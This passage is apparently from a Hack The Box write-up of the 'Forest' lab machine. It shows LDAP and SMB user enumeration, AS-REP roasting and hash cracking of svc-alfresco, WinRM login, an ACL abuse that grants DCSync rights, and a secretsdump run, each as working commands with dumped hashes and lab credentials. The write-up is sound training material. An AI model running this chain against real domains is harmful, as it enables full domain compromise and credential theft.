+supportedControl: 1.2.840.113556.1.4.1341
+supportedControl: 1.2.840.113556.1.4.2026
+supportedControl: 1.2.840.113556.1.4.2064
+supportedControl: 1.2.840.113556.1.4.2065
+supportedControl: 1.2.840.113556.1.4.2066
+supportedControl: 1.2.840.113556.1.4.2090
+supportedControl: 1.2.840.113556.1.4.2205
+supportedControl: 1.2.840.113556.1.4.2204
+supportedControl: 1.2.840.113556.1.4.2206
+supportedControl: 1.2.840.113556.1.4.2211
+supportedControl: 1.2.840.113556.1.4.2239
+supportedControl: 1.2.840.113556.1.4.2255
+supportedControl: 1.2.840.113556.1.4.2256
+supportedControl: 1.2.840.113556.1.4.2309
+supportedLDAPVersion: 3
+supportedLDAPVersion: 2
+supportedLDAPPolicies: MaxPoolThreads
+supportedLDAPPolicies: MaxPercentDirSyncRequests
+supportedLDAPPolicies: MaxDatagramRecv
+supportedLDAPPolicies: MaxReceiveBuffer
+supportedLDAPPolicies: InitRecvTimeout
+supportedLDAPPolicies: MaxConnections
+supportedLDAPPolicies: MaxConnIdleTime
+supportedLDAPPolicies: MaxPageSize
+supportedLDAPPolicies: MaxBatchReturnMessages
+supportedLDAPPolicies: MaxQueryDuration
+supportedLDAPPolicies: MaxDirSyncDuration
+supportedLDAPPolicies: MaxTempTableSize
+supportedLDAPPolicies: MaxResultSetSize
+supportedLDAPPolicies: MinResultSets
+supportedLDAPPolicies: MaxResultSetsPerConn
+supportedLDAPPolicies: MaxNotificationPerConn
+supportedLDAPPolicies: MaxValRange
+supportedLDAPPolicies: MaxValRangeTransitive
+supportedLDAPPolicies: ThreadMemoryLimit
+supportedLDAPPolicies: SystemMemoryLimitPercent
+highestCommittedUSN: 3346467
+supportedSASLMechanisms: GSSAPI
+supportedSASLMechanisms: GSS-SPNEGO
+supportedSASLMechanisms: EXTERNAL
+supportedSASLMechanisms: DIGEST-MD5
+dnsHostName: FOREST.htb.local
+ldapServiceName: htb.local:forest$@HTB.LOCAL
+serverName: CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Config
+ uration,DC=htb,DC=local
+supportedCapabilities: 1.2.840.113556.1.4.800
+supportedCapabilities: 1.2.840.113556.1.4.1670
+supportedCapabilities: 1.2.840.113556.1.4.1791
+supportedCapabilities: 1.2.840.113556.1.4.1935
+supportedCapabilities: 1.2.840.113556.1.4.2080
+supportedCapabilities: 1.2.840.113556.1.4.2237
+isSynchronized: TRUE
+isGlobalCatalogReady: TRUE
+domainFunctionality: 7
+forestFunctionality: 7
+domainControllerFunctionality: 7
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1</code></pre>
+</div>
+</details><p>#2 Null bind</p><p> <code>ldapsearch -H ldap://10.10.10.161 -x -b DC=htb,DC=local</code> → works! 🙂</p><aside class="block-color-gray_background callout" data-notion-callout="" data-notion-callout-icon="ℹ️" data-notion-callout-background="gray_background" style="white-space:pre-wrap;display:flex" id="3c9848dd-f68f-4375-872a-f701c5a545f0" dir="ltr"><div style="font-size:1.5em"><span class="icon" data-emoji="ℹ️"></span></div><div style="width:100%">I can go on and on about all LDAP enumeration techniques and what we can abuse for this null-bind access, but let’s just focus on user enumeration on this walkthrough</div></aside><p>#3 enumerating users</p><p><code>ldapsearch -H ldap://10.10.10.161 -x -b DC=htb,DC=local "(objectClass=person)" | grep "sAMAccountName:"</code></p><details>
+<summary>output</summary>
+<div class="inner">
+<pre><code>sAMAccountName: Guest
+sAMAccountName: DefaultAccount
+sAMAccountName: FOREST$
+sAMAccountName: EXCH01$
+sAMAccountName: $331000-VK4ADACQNUCA
+sAMAccountName: SM_2c8eef0a09b545acb
+sAMAccountName: SM_ca8c2ed5bdab4dc9b
+sAMAccountName: SM_75a538d3025e4db9a
+sAMAccountName: SM_681f53d4942840e18
+sAMAccountName: SM_1b41c9286325456bb
+sAMAccountName: SM_9b69f1b9d2cc45549
+sAMAccountName: SM_7c96b981967141ebb
+sAMAccountName: SM_c75ee099d0a64c91b
+sAMAccountName: SM_1ffab36a2f5f479cb
+sAMAccountName: HealthMailboxc3d7722
+sAMAccountName: HealthMailboxfc9daad
+sAMAccountName: HealthMailboxc0a90c9
+sAMAccountName: HealthMailbox670628e
+sAMAccountName: HealthMailbox968e74d
+sAMAccountName: HealthMailbox6ded678
+sAMAccountName: HealthMailbox83d6781
+sAMAccountName: HealthMailboxfd87238
+sAMAccountName: HealthMailboxb01ac64
+sAMAccountName: HealthMailbox7108a4e
+sAMAccountName: HealthMailbox0659cc1
+sAMAccountName: sebastien
+sAMAccountName: lucinda
+sAMAccountName: andy
+sAMAccountName: mark
+sAMAccountName: santi
+sAMAccountName: test1
+sAMAccountName: main-py
+sAMAccountName: john
+sAMAccountName: max
+sAMAccountName: Johan</code></pre>
+</div>
+</details></div></details></div></details>
+
+<details>
+<summary>SMB (enum4linux)</summary>
+<div class="inner">
+<p><code>enum4linux -v 10.10.10.161</code></p><details><summary>users</summary><div class="inner"><pre><code>user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+user:[test1] rid:[0x2581]
+user:[main-py] rid:[0x2582]
+user:[john] rid:[0x2583]
+user:[max] rid:[0x2584]
+user:[Johan] rid:[0x2585]</code></pre>
+</div>
+</details><details>
+<summary>password policy</summary>
+<div class="inner">
+<pre><code>[+] Attaching to 10.10.10.161 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+        [!] Protocol failed: Cannot request session (Called Name:10.10.10.161)
+
+[+] Trying protocol 445/SMB...
+
+[+] Found domain(s):
+
+        [+] HTB
+        [+] Builtin
+
+[+] Password Info for Domain: HTB
+
+        [+] Minimum password length: 7
+        [+] Password history length: 24
+        [+] Maximum password age: Not Set
+        [+] Password Complexity Flags: 000000
+
+                [+] Domain Refuse Password Change: 0
+                [+] Domain Password Store Cleartext: 0
+                [+] Domain Password Lockout Admins: 0
+                [+] Domain Password No Clear Change: 0
+                [+] Domain Password No Anon Change: 0
+                [+] Domain Password Complex: 0
+
+        [+] Minimum password age: 1 day 4 minutes
+        [+] Reset Account Lockout Counter: 30 minutes
+        [+] Locked Account Duration: 30 minutes
+        [+] Account Lockout Threshold: None
+        [+] Forced Log off Time: Not Set</code></pre>
+</div>
+</details><details>
+<summary>domain groups</summary>
+<div class="inner">
+<pre><code>group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Schema Admins] rid:[0x206]
+group:[Enterprise Admins] rid:[0x207]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[Key Admins] rid:[0x20e]
+group:[Enterprise Key Admins] rid:[0x20f]
+group:[DnsUpdateProxy] rid:[0x44e]
+group:[Organization Management] rid:[0x450]
+group:[Recipient Management] rid:[0x451]
+group:[View-Only Organization Management] rid:[0x452]
+group:[Public Folder Management] rid:[0x453]
+group:[UM Management] rid:[0x454]
+group:[Help Desk] rid:[0x455]
+group:[Records Management] rid:[0x456]
+group:[Discovery Management] rid:[0x457]
+group:[Server Management] rid:[0x458]
+group:[Delegated Setup] rid:[0x459]
+group:[Hygiene Management] rid:[0x45a]
+group:[Compliance Management] rid:[0x45b]
+group:[Security Reader] rid:[0x45c]
+group:[Security Administrator] rid:[0x45d]
+group:[Exchange Servers] rid:[0x45e]
+group:[Exchange Trusted Subsystem] rid:[0x45f]
+group:[Managed Availability Servers] rid:[0x460]
+group:[Exchange Windows Permissions] rid:[0x461]
+group:[ExchangeLegacyInterop] rid:[0x462]
+group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
+group:[Service Accounts] rid:[0x47c]
+group:[Privileged IT Accounts] rid:[0x47d]
+group:[test] rid:[0x13ed]</code></pre>
+</div>
+</details></div></details>
+
+<h2>Kerberos login</h2>
+
+<aside class="block-color-gray_background callout" data-notion-callout="" data-notion-callout-icon="ℹ️" data-notion-callout-background="gray_background" style="white-space:pre-wrap;display:flex" id="8f97e7d7-7664-4dd9-ba89-9c08505745df" dir="ltr"><div style="font-size:1.5em"><span class="icon" data-emoji="ℹ️"></span></div><div style="width:100%">The original Kerberos 4 protocol was susceptible to offline dictionary and brute-force attacks. To make this attack more difficult, Kerberos 5 introduces <em>pre-authentication. Pre-authentication requires that requestors prove their identity before the KDC will issue a ticket for a particular principal.</em></div></aside>
+
+<p><a href="https://github.com/ropnop/kerbrute" target="_blank" rel="noopener noreferrer">https://github.com/ropnop/kerbrute</a></p>
+
+<ol><li>Make a txt file with all user names<pre><code>sebastien
+lucinda
+andy
+mark
+santi
+test1
+john
+max
+Johan
+main-py
+svc-alfresco
+krbtgt</code></pre></li><li>Check for accounts that don’t require Pre-Authorization (using verbose option)</li></ol>
+
+<p><code>./kerbrute_linux_amd64 passwordspray -d htb.local --dc 10.10.10.161 users.txt '123' -v</code></p>
+
+<figure><img src="../assets/images/htb/forest/01-untitled.png" alt=""></figure>
+
+<p>→ <strong>svc-alfresco</strong></p>
+
+<p><strong>→ So this account is vulnerable to AS-REP roasting</strong></p>
+
+<h2>AS-REP roast <strong>svc-alfresco</strong></h2>
+
+<aside class="block-color-gray_background callout" data-notion-callout="" data-notion-callout-icon="ℹ️" data-notion-callout-background="gray_background" style="white-space:pre-wrap;display:flex" id="689be511-07ca-42e7-8b5f-8f003b05d0c7" dir="ltr"><div style="font-size:1.5em"><span class="icon" data-emoji="ℹ️"></span></div><div style="width:100%">For the user accounts that are enabled with no pre-Authentication, it’s vulnerable to AS-REP Roasting attack. We can request for that user’s Kerberos TGT ticket without providing any authentication, and the TGT ticket will be encrypted with the account’s password. So <mark class="highlight-yellow_background" data-notion-highlight="yellow_background"><strong>we can crack the hash offline</strong></mark>.</div></aside>
+
+<ol><li>Get ticket using impacket-GetNPUsers<p><code>impacket-GetNPUsers htb.local/svc-alfresco -no-pass -dc-ip 10.10.10.161</code></p><pre><code>$krb5asrep$23$svc-alfresco@HTB.LOCAL:cf12865740fba98999d477e6e619806b$4d31ccdcb297a96c72be6b6dcb123b5a8b42beece692a23d13b42240ecf74589868f3879936ae1a0a26a9ad7e136133793a4383d600ba1d9611e93337abd555d487f952ac0d9291dbde2af43d9ecd1cde93d6d479cd08aa0031730813e63f3f5a4e65df28d12dab758c1d54a6ab9e86867e93d81435d03a38f663927f11e3f2c2a2fc55cf8aafa5a4b03750b3e754095aa491501a43d1a3356c311aafdbab1cae68facebde180dba1e127e4af5994af3f53eb1e86a6260094d845b9ddc4f81b02e2ae2c53b44339dc3d4d5e8a31580b484dadcf9699734a0bf0606bcbb6104df247b4daf818c</code></pre></li><li>crack with hashcat</li></ol>
+
+<pre data-lang="powershell"><code>.\hashcat.exe -m18200 '$krb5asrep$23$svc-alfresco@HTB.LOCAL:cf12865740fba98999d477e6e619806b$4d31ccdcb297a96c72be6b6dcb123b5a8b42beece692a23d13b42240ecf74589868f3879936ae1a0a26a9ad7e136133793a4383d600ba1d9611e93337abd555d487f952ac0d9291dbde2af43d9ecd1cde93d6d479cd08aa0031730813e63f3f5a4e65df28d12dab758c1d54a6ab9e86867e93d81435d03a38f663927f11e3f2c2a2fc55cf8aafa5a4b03750b3e754095aa491501a43d1a3356c311aafdbab1cae68facebde180dba1e127e4af5994af3f53eb1e86a6260094d845b9ddc4f81b02e2ae2c53b44339dc3d4d5e8a31580b484dadcf9699734a0bf0606bcbb6104df247b4daf818c' -a 3 ..\rockyou.txt --force --potfile-disable</code></pre>
+
+<figure><img src="../assets/images/htb/forest/02-untitled-1.png" alt=""></figure>
+
+<p>→ svc-alfresco<mark class="highlight-red" data-notion-highlight="red">:</mark><strong><mark class="highlight-red" data-notion-highlight="red">s3rvice</mark></strong></p>
+
+<h2>login with credentials</h2>
+
+<ol><li>check open ports → 5985 <strong>WinRM</strong></li>
+<li>verify if the “svc-alfresco” user is indeed part of the “Remote Management Users”:<pre><code>[LDAP to Query Members of the "Remote Management Users"]
+$ ldapsearch -H ldap://10.10.10.161 -x -b DC=htb,DC=local | grep -A 11 -i "Remote Management Users"
+
+[NET RPC Command - Query "Privileged IT Accounts"]
+$ net rpc group members 'Privileged IT Accounts' -W 'htb.local' -I '10.10.10.161' -U'svc-alfresco'%'s3rvice' 2&gt;&amp;1
+
+[NET RPC Command - Query "Service Accounts"]
+$ net rpc group members 'Service Accounts' -W 'htb.local' -I '10.10.10.161' -U'svc-alfresco'%'s3rvice' 2&gt;&amp;1</code></pre></li><li>Login using evil-winrm</li></ol>
+
+<p><code>evil-winrm  -i 10.10.10.161 -u svc-alfresco -p s3rvice</code></p>
+
+<figure><img src="../assets/images/htb/forest/03-untitled-2.png" alt=""></figure>
+
+<p>Flag → <mark class="highlight-red" data-notion-highlight="red">9a9148ef68ad4a453a16c79df9d08509</mark></p>
+
+<h2>Bloodhound paths</h2>
+
+<figure><p><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse" target="_blank" rel="noopener noreferrer">Abusing Active Directory ACLs/ACEs</a></p></figure>
+
+<figure><img src="../assets/images/htb/forest/04-untitled-3.png" alt=""></figure>
+
+<aside class="block-color-gray_background callout" data-notion-callout="" data-notion-callout-icon="ℹ️" data-notion-callout-background="gray_background" style="white-space:pre-wrap;display:flex" id="3115758a-ef0f-4650-94d8-e396a3a3062c" dir="ltr"><div style="font-size:1.5em"><span class="icon" data-emoji="ℹ️"></span></div><div style="width:100%"></div></aside>
+
+<h3>Adding a user to Exchange Windows Permissions</h3>
+
+<ol><li>Get distinguished name:<pre data-lang="powershell"><code>Get-NetGroup "Exchange Windows Permissions" -FullData</code></pre><p><code>CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local</code></p></li><li>Double check ACL (GenericAll)
+
+<pre data-lang="powershell"><code>Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local"}</code></pre>
+
+<p>We can indeed find the Account Operators group</p>
+
+<pre><code>InheritedObjectType   : All
+ObjectDN              : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
+ObjectType            : All
+IdentityReference     : BUILTIN\Account Operators
+IsInherited           : False
+ActiveDirectoryRights : GenericAll
+PropagationFlags      : None
+ObjectFlags           : None
+InheritanceFlags      : None
+InheritanceType       : None
+AccessControlType     : Allow
+ObjectSID             : S-1-5-21-3072663084-364016917-1341370565-1121</code></pre>
+
+</li><li>Adding svc-alfresco to Exchange Windows Permissions
+
+<pre><code>net group "Exchange Windows Permissions" svc-alfresco  /add /domain</code></pre>
+
+</li><li>Check</li></ol>
+
+<pre><code>net user svc-alfresco /domain</code></pre>
+
+<figure><img src="../assets/images/htb/forest/05-untitled-4.png" alt=""></figure>
+
+<p>NOTE: It quickly changes the groups again. So the user isn’t actually added. (this might be a HTB thing). lets try adding a user</p>
+
+<pre><code>net user papi papi123 /add /domain
+net group "Exchange Windows Permissions" papi /add /domain</code></pre>
+
+<h3>priv escalation</h3>
+
+<figure><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener noreferrer">PowerView.ps1 · PowerShellMafia/PowerSploit</a></p></figure>
+
+<aside class="block-color-gray_background callout" data-notion-callout="" data-notion-callout-icon="ℹ️" data-notion-callout-background="gray_background" style="white-space:pre-wrap;display:flex" id="1747585e-519c-4c0e-a291-f27e9b5aab12" dir="ltr"><div style="font-size:1.5em"><span class="icon" data-emoji="ℹ️"></span></div><div style="width:100%">To abuse WriteDacl to a domain object, you may grant yourself DCSync privileges.<p>You may need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL if you are not running a process as a member.</p></div></aside>
+
+<ol><li>Since we do not have a process running as that user. lets start over:<pre><code>. .\PowerView.ps1
+$SecPassword = ConvertTo-SecureString 'papi123' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('HTB\papi', $SecPassword)</code></pre></li><li>Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL:
+
+<pre data-lang="powershell"><code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity papi -Rights DCSync</code></pre>
+
+</li><li>DCSync attack using impacket secretsdump
+
+<pre><code>impacket-secretsdump -outputfile 'outpDcSync' htb.local/papi:papi123@10.10.10.161</code></pre>
+
+<details>
+<summary>Hashes</summary>
+<div class="inner">
+<pre><code>htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
+htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
+htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
+htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
+htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
+htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
+htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
+htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
+htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
+htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
+htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
+htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+papi:9602:aad3b435b51404eeaad3b435b51404ee:3bbe74b519be6e67a17da7995b77108d:::
+FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:4686eef597846ea89ec3bb8a1e84c3ed:::
+EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
+[*] Kerberos keys grabbed
+htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
+htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
+htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
+krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
+krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
+krbtgt:des-cbc-md5:9dd5647a31518ca8
+htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
+htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
+htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
+htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
+htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
+htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
+htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
+htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
+htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
+htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
+htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
+htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
+htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
+htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
+htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
+htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
+htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
+htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
+htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
+htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
+htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
+htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
+htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
+htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
+htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
+htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
+htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
+htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
+htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
+htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
+htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
+htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
+htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
+htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
+htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
+htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
+htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
+htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
+htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
+htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
+htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
+htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
+htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
+htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
+htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
+htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
+htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
+htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
+htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
+htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
+htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
+papi:aes256-cts-hmac-sha1-96:866e221739fc9b182716d354e503dfded3e823cebf709d9bef2b8ec623ec3b2f
+papi:aes128-cts-hmac-sha1-96:bf9380f4d037ea9dc4d1afb905e2a2c8
+papi:des-cbc-md5:0e1c298aea9e1fa1
+FOREST$:aes256-cts-hmac-sha1-96:f050d4ab244ca49af222a4d669c73e4b49c2f4daefe58c586219d934f0c635e0
+FOREST$:aes128-cts-hmac-sha1-96:53cff42247c52232ba967b4a0af0604c
+FOREST$:des-cbc-md5:98077a5e7c57fe8a
+EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
+EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
+EXCH01$:des-cbc-md5:8c45f44c16975129</code></pre>
+</div>
+</details>
+
